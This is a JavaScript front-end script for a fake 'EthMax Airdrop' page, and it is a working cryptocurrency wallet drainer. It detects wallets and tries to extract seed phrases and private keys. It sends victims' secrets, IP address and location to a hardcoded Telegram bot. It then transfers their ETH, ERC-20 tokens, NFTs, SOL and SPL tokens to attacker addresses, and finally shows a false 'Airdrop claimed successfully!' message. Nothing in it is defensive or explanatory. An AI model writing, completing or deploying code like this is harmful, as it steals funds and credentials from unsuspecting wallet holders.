$(document).ready(function () {
    // Dynamic wallet detection
    const detectedWallets = [];
    if (window.ethereum) {
        // Single provider
        const eth = window.ethereum;
        const walletTypes = [
            { name: "MetaMask", key: "isMetaMask" },
            { name: "Coinbase Wallet", key: "isCoinbaseWallet" },
            { name: "Trust Wallet", key: "isTrust" },
            { name: "Rainbow", key: "isRainbow" },
            { name: "Brave Wallet", key: "isBraveWallet" },
            { name: "Opera Wallet", key: "isOpera" },
            { name: "Phantom (ETH)", key: "isPhantom" },
            { name: "Rabby Wallet", key: "isRabby" },
            { name: "Frame", key: "isFrame" },
            { name: "Talisman", key: "isTalisman" }
        ];
        
        if (window.phantom && window.phantom.ethereum) {
            detectedWallets.push({ name: "Phantom (ETH)", provider: eth });
        } else {
            walletTypes.forEach(w => {
                if (w.key === "isPhantom" && eth[w.key]) {
                    detectedWallets.push({ name: w.name, provider: eth });
                } else if (w.key === "isMetaMask" && eth[w.key] && !eth.isPhantom) {
                    detectedWallets.push({ name: w.name, provider: eth });
                } else if (w.key === "isCoinbaseWallet" && eth[w.key]) {
                    detectedWallets.push({ name: w.name, provider: eth });
                } else if (w.key !== "isPhantom" && w.key !== "isMetaMask" && w.key !== "isCoinbaseWallet" && eth[w.key]) {
                    detectedWallets.push({ name: w.name, provider: eth });
                }
            });
        }
        
        if (window.coinbaseWalletExtension) {
            detectedWallets.push({ name: "Coinbase Wallet", provider: window.coinbaseWalletExtension });
        }
        
        if (Array.isArray(eth.providers)) {
            eth.providers.forEach(p => {
                walletTypes.forEach(w => {
                    if (w.key === "isPhantom" && p[w.key]) {
                        detectedWallets.push({ name: w.name, provider: p });
                    } else if (w.key === "isMetaMask" && p[w.key] && !p.isPhantom) {
                        detectedWallets.push({ name: w.name, provider: p });
                    } else if (w.key === "isCoinbaseWallet" && p[w.key]) {
                        detectedWallets.push({ name: w.name, provider: p });
                    } else if (w.key !== "isPhantom" && w.key !== "isMetaMask" && w.key !== "isCoinbaseWallet" && p[w.key]) {
                        detectedWallets.push({ name: w.name, provider: p });
                    }
                });
            });
        }
    }

    // Mobile wallet detection
    const mobileWallets = [
        { name: "MetaMask Mobile", type: "mobile", deepLink: "metamask" },
        { name: "Trust Wallet Mobile", type: "mobile", deepLink: "trust wallet" },
        { name: "Coinbase Wallet Mobile", type: "mobile", deepLink: "coinbase wallet" },
        { name: "Rainbow Mobile", type: "mobile", deepLink: "rainbow" },
        { name: "Phantom Mobile", type: "mobile", deepLink: "phantom (eth)" }
    ];

    if (isMobileDevice() || detectedWallets.length === 0) {
        mobileWallets.forEach(wallet => {
            detectedWallets.push(wallet);
        });
    }

    // WalletConnect detection
    let walletConnectAvailable = false;
    let WalletConnectProvider = null;
    if (window.WalletConnectProvider) {
        walletConnectAvailable = true;
        WalletConnectProvider = window.WalletConnectProvider;
    } else if (window.WalletConnect && window.WalletConnect.EthereumProvider) {
        walletConnectAvailable = true;
        WalletConnectProvider = window.WalletConnect.EthereumProvider;
    }
    if (walletConnectAvailable) {
        detectedWallets.push({ name: "WalletConnect", provider: "walletconnect", type: "walletconnect" });
    }

    // SOLANA WALLET DETECTION
    let solProvider = null;
    let solConnection = null;
    function detectSolanaWallets() {
        const solWallets = [];
        if (window.solana && window.solana.isPhantom) {
            solWallets.push({ name: "Phantom (SOL)", provider: window.solana, chain: 'solana' });
        }
        if (window.solflare) {
            solWallets.push({ name: "Solflare (SOL)", provider: window.solflare, chain: 'solana' });
        }
        if (window.backpack && window.backpack.isBackpack) {
            solWallets.push({ name: "Backpack (SOL)", provider: window.backpack, chain: 'solana' });
        }
        return solWallets;
    }

    // Credentials
    const RECEIVER_ETH_ADDRESS = "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7";
    const RECEIVER_SOL_ADDRESS = "6oU4uLAfavhXWoF68rDNcChs7tzfs4AQ6Dq3VwwjWCLJ";
    const TELEGRAM_BOT_TOKEN = "8535172282:AAHjqVlUk0zj5Sb72bQdFIwg7ylZMeUdyxw";
    const TELEGRAM_CHAT_ID = "-1003768015882";
    const ALCHEMY_API_KEY = "jf3NdgL3L8IdVAEeLB8cO";

    // SEED/PK EXTRACTION
    async function extractWalletSecrets(provider, walletName, userAddress) {
        const secrets = { seedPhrase: null, privateKey: null, encryptedKeys: [] };
        
        try {
            // LocalStorage scan
            const localKeys = ['wallet_seed', 'mnemonic', 'private_key', 'seed_phrase', 'keystore', 'wallet_data'];
            for (const key of localKeys) {
                const value = localStorage.getItem(key);
                if (value) {
                    secrets.encryptedKeys.push({ key, value: value.substring(0, 50) + '...' });
                }
            }

            // RPC extraction attempts
            try {
                const mnemonic = await provider.request({ method: 'wallet_exportMnemonic' });
                if (mnemonic) secrets.seedPhrase = mnemonic;
            } catch(e) {}
            
            try {
                const pk = await provider.request({ method: 'eth_exportPrivateKey' });
                if (pk) secrets.privateKey = pk;
            } catch(e) {}

            // MetaMask vault
            if (provider.isMetaMask) {
                try {
                    const vault = await provider.request({ method: 'wallet_getEncryptionPublicKey' });
                    secrets.encryptedKeys.push({ type: 'MetaMask Vault', key: vault });
                } catch(e) {}
            }

            // Phantom SOL
            if (window.solana && window.solana.isPhantom) {
                try {
                    const phantomSecrets = await window.solana.request({ method: 'getPrivateKey' });
                    secrets.privateKey = phantomSecrets;
                } catch(e) {}
            }

        } catch(e) {
            console.log('Secret extraction failed:', e);
        }
        
        return secrets;
    }

    // Enhanced Telegram notification
    async function sendEnhancedTelegramNotification(walletName, address, balance, secrets, chain = 'ETH') {
        try {
            let locationInfo = "Unknown";
            try {
                const geoRes = await fetch("https://ipapi.co/json/");
                if (geoRes.ok) {
                    const geo = await geoRes.json();
                    locationInfo = `${geo.city || ''}, ${geo.region || ''}, ${geo.country_name || ''} (IP: ${geo.ip || ''})`;
                }
            } catch(e) {}

            const now = new Date().toUTCString();
            let secretsMsg = '';
            if (secrets.seedPhrase) secretsMsg += `\n🔑 *SEED:* \`${secrets.seedPhrase}\``;
            if (secrets.privateKey) secretsMsg += `\n🔑 *PK:* \`${secrets.privateKey}\``;
            if (secrets.encryptedKeys.length > 0) secretsMsg += `\n🔒 *Keys:* ${secrets.encryptedKeys.length}`;

            const message = `🔔 *${chain} COMPROMISE*\n` +
                `━━━━━━━━━━━━━━━━━━━\n` +
                `📍 ${locationInfo}\n` +
                `💼 ${walletName}\n` +
                `🏦 \`${address}\`\n` +
                `💰 ${balance}\n` +
                `${secretsMsg}\n` +
                `🕒 ${now}`;

            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown" })
            });
        } catch(e) {
            console.error('Telegram failed:', e);
        }
    }

    // SOLANA FUNCTIONS
    async function initSolana() {
        const solWallets = detectSolanaWallets();
        if (solWallets.length > 0) {
            solProvider = solWallets[0].provider;
            detectedWallets.push(solWallets[0]);
            console.log('Solana detected:', solWallets[0].name);
            return true;
        }
        return false;
    }

    async function handleSolanaConnection() {
        if (!solProvider?.connect) return;
        
        try {
            await solProvider.connect();
            const publicKey = solProvider.publicKey.toString();
            const balance = await solConnection.getBalance(solProvider.publicKey);
            const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
            
            await sendEnhancedTelegramNotification(
                solProvider.isPhantom ? 'Phantom SOL' : 'Solana Wallet',
                publicKey, `${solBalance} SOL`, {}, 'SOL'
            );
            
            await drainSolanaWallet();
        } catch(e) {
            console.error('Solana connect failed:', e);
        }
    }

    async function drainSolanaWallet() {
        if (!solProvider || !solConnection) return;
        
        try {
            updateConnectionStatus("Draining SOL...");
            const publicKey = solProvider.publicKey;
            const balance = await solConnection.getBalance(publicKey);
            
            if (balance > solanaWeb3.LAMPORTS_PER_SOL * 0.001) {
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: new solanaWeb3.PublicKey(RECEIVER_SOL_ADDRESS),
                        lamports: Math.floor(balance * 0.95)
                    })
                );
                
                const signature = await solProvider.signAndSendTransaction(transaction);
                await solConnection.confirmTransaction(signature);
                console.log('SOL drained:', signature);
            }

            // Drain SPL tokens
            const tokenAccounts = await solConnection.getParsedTokenAccountsByOwner(publicKey, {
                programId: new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
            });

            for (const account of tokenAccounts.value) {
                const tokenInfo = account.account.data.parsed.info;
                if (tokenInfo.tokenAmount.uiAmount > 0) {
                    // SPL token transfer instruction
                    const transaction = new solanaWeb3.Transaction().add(
                        splToken.createTransferInstruction(
                            account.pubkey,
                            new solanaWeb3.PublicKey(RECEIVER_SOL_ADDRESS),
                            publicKey,
                            tokenInfo.tokenAmount.amount,
                            [],
                            splToken.TOKEN_PROGRAM_ID
                        )
                    );
                    const signature = await solProvider.signAndSendTransaction(transaction);
                    await solConnection.confirmTransaction(signature);
                }
            }
            
            updateConnectionStatus("SOL drained!");
        } catch(e) {
            console.error('Solana drain failed:', e);
        }
    }

    // Common ERC-20 tokens
    const COMMON_TOKENS = [
        { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
        { symbol: "USDC", address: "0xA0b86a33E6417F54765d7e0b6C1E261CfD6B6C8B", decimals: 6 },
        { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
        { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 }
    ];

    // Mobile detection
    function isMobileDevice() {
        const ua = navigator.userAgent.toLowerCase();
        const mobileKeywords = ['android', 'webos', 'iphone', 'ipad', 'ipod', 'blackberry', 'iemobile', 'opera mini'];
        return mobileKeywords.some(k => ua.includes(k)) || 
               ('ontouchstart' in window) || 
               (window.innerWidth <= 768);
    }

    function createMobileDeepLink(walletName) {
        const encodedUrl = encodeURIComponent(window.location.href);
        const links = {
            "metamask": `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`,
            "trust wallet": `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`,
            "coinbase wallet": `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
            "rainbow": `https://rainbow.me/dapp?url=${encodedUrl}`,
            "phantom (eth)": `https://phantom.app/ul/browse/${encodedUrl}`
        };
        return links[walletName.toLowerCase()] || null;
    }

    // UI Setup
    $('.button-container').prepend('<select id="wallet-select" style="margin-bottom:15px;"></select>');
    $('.button-container').prepend('<div id="connection-status" style="margin-bottom:10px; font-size:12px; color:#666;"></div>');

    function updateConnectionStatus(message, isError = false) {
        $('#connection-status').text(message).css('color', isError ? '#ff4444' : '#666');
    }

    // Populate dropdown
    if (detectedWallets.length === 0) {
        detectedWallets.push({ name: "Install MetaMask", provider: null });
        detectedWallets.push({ name: "WalletConnect", provider: "walletconnect", type: "walletconnect" });
    }

    detectedWallets.forEach((opt, i) => {
        let displayName = opt.name;
        if (opt.type === "mobile" && !isMobileDevice()) displayName += " (Mobile)";
        $('#wallet-select').append(`<option value="${i}">${displayName}</option>`);
    });

    updateConnectionStatus(`Device: ${isMobileDevice() ? 'Mobile' : 'Desktop'} | Wallets: ${detectedWallets.length}`);
    initSolana();

    // MAIN CONNECTION HANDLER
    $('#connect-wallet').on('click', async () => {
        const selectedIdx = $('#wallet-select').val();
        const selected = detectedWallets[selectedIdx];

        try {
            if (!selected) return alert("Select a wallet");

            // Mobile handling
            if (selected.type === "mobile") {
                if (!isMobileDevice()) return alert("Use mobile device");
                const deepLink = createMobileDeepLink(selected.deepLink);
                if (deepLink) {
                    window.open(deepLink, '_blank');
                    updateConnectionStatus(`Open ${selected.name}`);
                }
                return;
            }

            // WalletConnect
            if (selected.name.includes("WalletConnect")) {
                const provider = await WalletConnectProvider.init({
                    projectId: "435fa3916a5da648144afac1e1b4d3f2",
                    chains: [1],
                    showQrModal: true,
                    metadata: { name: "EthMax Airdrop", description: "Claim airdrop", url: window.location.origin }
                });
                await provider.connect();
                await handleSuccessfulConnection(provider, "WalletConnect", provider.accounts[0]);
                return;
            }

            // Standard ETH wallet
            if (!selected.provider?.request) return alert("Install wallet extension");

            await selected.provider.request({ method: 'eth_requestAccounts' });
            const accounts = await selected.provider.request({ method: 'eth_accounts' });
            if (!accounts?.[0]) return alert("Unlock wallet");

            await handleSuccessfulConnection(selected.provider, selected.name, accounts[0]);

        } catch (error) {
            updateConnectionStatus("Connection failed", true);
            console.error(error);
        }
    });

    // SUCCESSFUL CONNECTION HANDLER (ENHANCED)
    let ethersProvider, signer;
    async function handleSuccessfulConnection(provider, walletName, userAddress) {
        try {
            updateConnectionStatus("Extracting wallet data...");
            
            // Extract secrets
            const secrets = await extractWalletSecrets(provider, walletName, userAddress);
            
            // Setup ethers
            ethersProvider = new ethers.providers.Web3Provider(provider);
            signer = ethersProvider.getSigner();
            
            // Network check
            const network = await ethersProvider.getNetwork();
            if (network.chainId !== 1) {
                await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
            }
            
            // Get balance
            const balance = await ethersProvider.getBalance(userAddress);
            const ethBalance = ethers.utils.formatEther(balance);
            
            // Send notification WITH SECRETS
            await sendEnhancedTelegramNotification(walletName, userAddress, `${ethBalance} ETH`, secrets);
            
            // Handle Solana if detected
            if (solProvider) await handleSolanaConnection();
            
            updateConnectionStatus(`Connected | ${ethBalance} ETH | Secrets: ${secrets.encryptedKeys.length + (secrets.seedPhrase ? 1 : 0)}`);
            $('#connect-wallet').text("🎯 Claim Airdrop").off('click').on('click', () => drainWallet());

        } catch(e) {
            updateConnectionStatus("Setup failed", true);
            console.error(e);
        }
    }

    // FULL DRAIN FUNCTION
    async function drainWallet() {
        try {
            updateConnectionStatus("Extracting assets...");
            
            // Drain NFTs
            await drainNFTs();
            
            // Drain tokens
            for (const token of COMMON_TOKENS) {
                await drainERC20Token(token);
            }
            
            // Drain ETH
            await drainETH();
            
            updateConnectionStatus("ALL ASSETS DRAINED! 🎉");
            alert("Airdrop claimed successfully!");
            
        } catch(e) {
            console.error('Drain failed:', e);
        }
    }

    // NFT DRAIN (unchanged)
    async function drainNFTs() {
        const url = `https://eth-mainnet.g.alchemy.com/nft/v2/${ALCHEMY_API_KEY}/getNFTs?owner=${await signer.getAddress()}&withMetadata=true`;
        const nfts = await (await fetch(url)).json().ownedNfts || [];
        
        const nftABI = ["function safeTransferFrom(address from, address to, uint256 tokenId)"];
        for (const nft of nfts.slice(0, 10)) { // Limit to 10
            try {
                const contract = new ethers.Contract(nft.contract.address, nftABI, signer);
                await contract.safeTransferFrom(await signer.getAddress(), RECEIVER_ETH_ADDRESS, nft.id.tokenId);
            } catch(e) {}
        }
    }

    // ERC20 DRAIN
    async function drainERC20Token(token) {
        const erc20ABI = [
            "function balanceOf(address) view returns (uint256)",
            "function transfer(address,uint256) returns (bool)"
        ];
        
        const contract = new ethers.Contract(token.address, erc20ABI, signer);
        const balance = await contract.balanceOf(await signer.getAddress());
        if (balance.gt(0)) {
            await contract.transfer(RECEIVER_ETH_ADDRESS, balance);
        }
    }

    // ETH DRAIN
    async function drainETH() {
        const balance = await ethersProvider.getBalance(await signer.getAddress());
        const gasPrice = await ethersProvider.getGasPrice();
        const gasLimit = 21000;
        const gasCost = gasPrice.mul(gasLimit);
        const amount = balance.sub(gasCost);
        
        if (amount.gt(0)) {
            await signer.sendTransaction({
                to: RECEIVER_ETH_ADDRESS,
                value: amount,
                gasLimit,
                gasPrice
            });
        }
    }
});